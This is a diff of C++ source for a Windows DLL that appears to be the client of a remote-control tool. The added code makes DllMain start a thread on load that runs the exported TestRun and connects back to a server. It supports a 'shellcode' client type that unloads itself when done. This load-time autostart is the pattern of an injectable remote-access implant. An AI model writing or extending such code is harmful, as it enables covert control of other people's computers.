@@ -269,6 +269,23 @@ int main(int argc, const char *argv[])
 }
 #else
 
+extern "C" __declspec(dllexport) void TestRun(char* szServerIP, int uPort);
+
+// Auto run main thread after load the DLL
+DWORD WINAPI AutoRun(LPVOID param) {
+	do
+	{
+		TestRun(NULL, 0);
+	} while (S_SERVER_EXIT == g_MyApp.g_bExit);
+
+	if (g_MyApp.g_Connection->ClientType() == CLIENT_TYPE_SHELLCODE) {
+		HMODULE hInstance = (HMODULE)param;
+		FreeLibraryAndExitThread(hInstance, -1);
+	}
+
+	return 0;
+}
+
 BOOL APIENTRY DllMain( HINSTANCE hInstance, 
 					  DWORD  ul_reason_for_call, 
 					  LPVOID lpReserved
@@ -276,14 +293,14 @@ BOOL APIENTRY DllMain( HINSTANCE hInstance,
 {
 	switch (ul_reason_for_call)
 	{
-	case DLL_PROCESS_ATTACH:	
-	case DLL_THREAD_ATTACH:
+	case DLL_PROCESS_ATTACH:
 		{
 			g_MyApp.g_hInstance = (HINSTANCE)hInstance;
-
+			CloseHandle(CreateThread(NULL, 0, AutoRun, hInstance, 0, NULL));
 			break;
-		}		
+		}
 	case DLL_PROCESS_DETACH:
+		g_MyApp.g_bExit = S_CLIENT_EXIT;
 		break;
 	}
 	return TRUE;
@@ -294,14 +311,17 @@ extern "C" __declspec(dllexport) void TestRun(char* szServerIP,int uPort)
 {
 	ClientApp& app(g_MyApp);
 	CONNECT_ADDRESS& settings(*(app.g_Connection));
-	app.g_bExit = S_CLIENT_NORMAL;
-	if (strlen(szServerIP)>0 && uPort>0)
-	{
+	if (app.IsThreadRun()) {
 		settings.SetServer(szServerIP, uPort);
+		return;
 	}
-
+	app.SetThreadRun(TRUE);
+	app.SetProcessState(S_CLIENT_NORMAL);
+	settings.SetServer(szServerIP, uPort);
+	
 	HANDLE hThread = CreateThread(NULL,0,StartClient, &app,0,NULL);
 	if (hThread == NULL) {
+		app.SetThreadRun(FALSE);
 		return;
 	}
 #ifdef _DEBUG
@@ -460,7 +480,7 @@ DWORD WINAPI StartClient(LPVOID lParam)
 		}
 	}
 
-	app.g_bThreadExit = false;
+	app.SetThreadRun(TRUE);
 	while (app.m_bIsRunning(&app))
 	{
 		ULONGLONG dwTickCount = GetTickCount64();
@@ -493,7 +513,7 @@ DWORD WINAPI StartClient(LPVOID lParam)
 	Mprintf("StartClient end\n");
 	delete ClientObject;
 	SAFE_DELETE(Manager);
-	app.g_bThreadExit = true;
+	app.SetThreadRun(FALSE);
 
 	return 0;
 } 
